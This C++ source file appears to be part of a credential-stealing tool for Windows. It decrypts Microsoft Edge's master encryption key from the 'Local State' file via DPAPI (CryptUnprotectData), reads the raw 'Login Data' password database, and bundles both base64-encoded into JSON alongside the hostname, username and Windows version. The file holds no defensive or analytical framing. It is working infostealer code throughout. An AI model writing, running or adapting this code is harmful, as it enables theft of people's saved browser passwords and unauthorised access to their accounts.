#include<iostream>
#include "Enumerator.h"
#include <windows.h>
#include <ShlObj.h>
#include <sstream>
#include <map>
#include <string>
#include <fstream>
#include <wincrypt.h>
#include <cstdlib>
#include <nlohmann/json.hpp>

#include "base64.hpp"

using json = nlohmann::json;

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Crypt32.lib")


std::string GetAppDataPath() {
	wchar_t* path = nullptr;
	if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &path))) {
		std::wstring wpath(path);
		CoTaskMemFree(path);
		return std::string(wpath.begin(), wpath.end());
	}
	return "";
}
std::string GetWinVersion() {
	typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
	if (!hMod) return "Unknown";
	RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
	if (!fn) return "Unknown";
	RTL_OSVERSIONINFOW info = { 0 };
	info.dwOSVersionInfoSize = sizeof(info);
	if (fn(&info) != 0) return "Unknown";

	DWORD build = info.dwBuildNumber;
	if (build >= 22000)
		return "Windows 11";
	else if (build >= 10240)
		return "Windows 10";
	else if (info.dwMajorVersion == 6 && info.dwMinorVersion == 3)
		return "Windows 8.1";
	else if (info.dwMajorVersion == 6 && info.dwMinorVersion == 2)
		return "Windows 8";

	return "Older Windows";
}

std::string uprotectkey(const std::string& key) {
	DATA_BLOB encryptedBlob;
	DATA_BLOB plaintextBlob;
	LPWSTR pDescrOut = NULL;
	std::string plaintext;

	encryptedBlob.pbData = reinterpret_cast<BYTE*>(const_cast<char*>(key.data()));
	encryptedBlob.cbData = static_cast<DWORD>(key.size());

	BOOL success = CryptUnprotectData(
		&encryptedBlob,
		&pDescrOut,
		NULL,
		NULL,
		NULL,
		0,
		&plaintextBlob
	);

	if (success) {

		plaintext.assign(reinterpret_cast<char*>(plaintextBlob.pbData), plaintextBlob.cbData);
		LocalFree(plaintextBlob.pbData);

		if (pDescrOut) {
			LocalFree(pDescrOut);
		}
	}

	return plaintext;
}

std::string masterkey(const std::string& path) {
	std::string full_path = path + "\\Local State";
	std::fstream keyfile;
	keyfile.open(full_path, std::fstream::in);
	json data = json::parse(keyfile);
	std::string decoded64key = base64::from_base64(data["os_crypt"]["encrypted_key"]).substr(5);
	keyfile.close();
	return uprotectkey(decoded64key);

}
std::string GetDBContent(const std::string& db_path) {
	std::ifstream db_file(db_path, std::ios::binary);
	std::stringstream buffer;
	buffer << db_file.rdbuf();
	return buffer.str();
}

json EdgePasswords() {
	std::string db_path = GetAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
	std::string key_path = GetAppDataPath() + "\\Microsoft\\Edge\\User Data";
	std::string unprotected_key = masterkey(key_path);
	std::string db_content = GetDBContent(db_path);
	json output;
	output["master_key"] = base64::to_base64(unprotected_key);
	output["db_content"] = base64::to_base64(db_content);
	return output;
}

std::string GetHostName() {
	char buffer[MAX_COMPUTERNAME_LENGTH+1];
	DWORD size = sizeof(buffer);
	if (GetComputerNameA(buffer, &size))
		return std::string(buffer);
}
std::string GetUName() {
	char buffer[256];
	DWORD size = sizeof(buffer);
	if (GetUserNameA(buffer, &size))
		return std::string(buffer);
	return "SYSTEM/NT AUTHORITY";
}
